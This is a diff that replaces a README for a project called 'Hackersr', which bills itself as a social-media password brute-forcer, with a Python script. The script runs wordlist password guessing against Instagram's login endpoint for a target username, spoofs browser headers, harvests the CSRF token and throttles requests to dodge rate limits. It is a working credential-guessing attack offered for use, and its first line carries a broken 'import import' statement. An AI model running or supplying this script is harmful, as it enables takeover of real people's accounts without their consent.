@@ -1,33 +1,66 @@
-<div align="center">
-  <h1>Hackersr</h1>
-  <p>A password brute-forcing tool!</p>
-</div>
+import import requests
+import time
 
-<div align="center">
-    <a href="https://github.com/Hacker-dev-ai/hackersr/blob/main/LICENSE">
-        <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License" />
-    </a>  
-    <a href="https://github.com/Hacker-dev-ai/hackersr/releases">
-        <img src="https://img.shields.io/badge/version0.0.0-blue.svg" alt="Version" />
-    </a>
-</div>
+# Tool created by hackersr
+# Instagram login URL
+LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"
 
-**Hackersr** is a powerful and versatile tool designed for developers to perform automated login attempts on various social media platforms. It is a casual and random project in the field of Information Security, offering a robust framework for brute-forcing with advanced features to minimize detection risks.
+# Headers to mimic a real browser
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "X-Requested-With": "XMLHttpRequest",
+    "Referer": "https://www.instagram.com/accounts/login/",
+}
 
-In today's web applications, brute-forcing is often inefficient due to modern security measures like **Account Locking**. While tools like Hackersr can help uncover passwords, the success of such attempts heavily depends on the target website's security mechanisms.
+# Function to attempt login
+def attempt_login(username, password):
+    session = requests.Session()
+    session.headers.update(HEADERS)
 
-## **Key Features**
+    # Get CSRF token
+    response = session.get("https://www.instagram.com/accounts/login/")
+    csrf_token = response.cookies.get("csrftoken")
 
-- **Brute Force**: Advanced algorithms for efficient brute-force attacks.
-- **Customization**: Flexible parameters to adapt to specific use cases.
-- **Multi-threaded**: Concurrent execution for faster results.
-- **Logging**: Detailed logs for monitoring and debugging.
+    # Prepare login payload
+    payload = {
+        "username": username,
+        "password": password,
+        "queryParams": "{}",
+        "optIntoOneTap": "false",
+    }
+    headers = {
+        "X-CSRFToken": csrf_token,
+    }
 
-## **Installation**
+    # Send login request
+    login_response = session.post(LOGIN_URL, data=payload, headers=headers)
+    return login_response.json()
 
-Getting started with Hackersr is simple and can be done in just a few steps:
+# Function to brute-force login
+def brute_force(username, wordlist):
+    with open(wordlist, "r") as file:
+        passwords = file.read().splitlines()
 
-1. **Clone the Repository**
+    for password in passwords:
+        print(f"Trying password: {password}")
+        result = attempt_login(username, password)
 
-   ```bash
-   git clone https://github.com/Hacker-dev-ai/hackersr.git
+        if result.get("authenticated"):
+            print(f"[+] Success! Password found: {password}")
+            return password
+        else:
+            print(f"[-] Failed: {password}")
+
+        # Avoid rate-limiting
+        time.sleep(2)
+
+    print("[-] No valid password found in the wordlist.")
+    return None
+
+# Main function
+if __name__ == "__main__":
+    username = input("Enter the target username: ")
+    wordlist = input("Enter the path to the wordlist file (e.g., passwords.txt): ")
+
+    print(f"[*] Starting brute-force attack on {username}...")
+    brute_force(username, wordlist)
